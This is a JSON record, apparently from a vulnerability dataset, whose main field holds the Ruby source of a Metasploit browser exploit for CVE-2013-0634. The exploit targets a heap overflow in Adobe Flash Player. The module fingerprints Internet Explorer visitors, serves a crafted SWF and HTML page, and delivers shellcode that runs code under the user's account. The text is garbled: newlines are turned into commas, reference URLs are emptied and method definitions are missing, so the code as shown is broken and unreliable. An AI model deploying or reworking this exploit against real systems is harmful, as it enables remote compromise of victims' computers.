{
    "text": "vul_name : Adobe Flash Player Regular Expression Heap Overflow ， vul_cve : CVE-2013-0634 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : Remote : BrowserExploitServer ， super ( update_info ( info ,  ， 'Name' => \"Adobe Flash Player Regular Expression Heap Overflow\" ,  ， 'Description' => %q{ ， This module exploits a vulnerability found in the ActiveX component of Adobe ， Flash Player before 11.5.502.149. By supplying a specially crafted swf file ， with special regex value , it is possible to trigger an memory corruption , which ， results in remote code execution under the context of the user , as exploited in ， the wild in February 2013. This module has been tested successfully with Adobe ， Flash Player 11.5 before 11.5.502.149 on Windows XP SP3 and Windows 7 SP1 before ， MS13-063 , since it takes advantage of a predictable SharedUserData in order to ， leak ntdll and bypass ASLR. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Unknown' ,  # malware sample ， 'Boris \"dukeBarman\" Ryutin' ,  # msf exploit ， 'juan vazquez' # ActionScript deobfuscation and cleaning ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-0634' ]  ,  ，  [ 'OSVDB' , '89936' ]  ,  ，  [ 'BID' , '57787' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Payload' => ， { ， 'Space' => 1024 ,  ， 'DisableNops' => true ， } ,  ， 'DefaultOptions' => ， { ， 'InitialAutoRunScript' => 'migrate -f' ,  ， 'Retries' => false ， } ,  ， 'Platform' => 'win' ,  ， 'BrowserRequirements' => ， { ，  : source => /script | headers/i ,  ，  : clsid => \"{D27CDB6E-AE6D-11cf-96B8-444553540000}\" ,  ，  : method => \"LoadMovie\" ,  ，  : os_name => Msf : OperatingSystems : WINDOWS ,  ，  : ua_name => Msf : HttpClients : IE ,  ，  : flash => lambda { | ver | ver = ~ /^11\\.5/ ver < '11.5.502.149' } ， } ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Feb 8 2013\" ,  ， 'DefaultTarget' => 0 )  ， end ， def exploit ，  @ swf = create_swf ， super ， end ， print_status ( \"Request :  # {request.uri}\" )  ， print_status ( \"Sending SWF.\" )  ， send_response ( cli ,  @ swf , {'Content-Type'=>'application/x-shockwave-flash' , 'Pragma' => 'no-cache'} )  ， end ， print_status ( \"Sending HTML.\" )  ， tag = retrieve_tag ( cli , request )  ， profile = get_profile ( tag )  ， profile [  : tried ] = false unless profile.nil? # to allow request the swf ， send_exploit_html ( cli , exploit_template ( cli , target_info )  , {'Pragma' => 'no-cache'} )  ， end ， swf_random = \" # {rand_text_alpha ( 4 + rand ( 3 ) }.swf\" ， shellcode = get_payload ( cli , target_info ) .unpack ( \"H * \" )  [ 0 ] ",
    "time": "2014.04.19"
}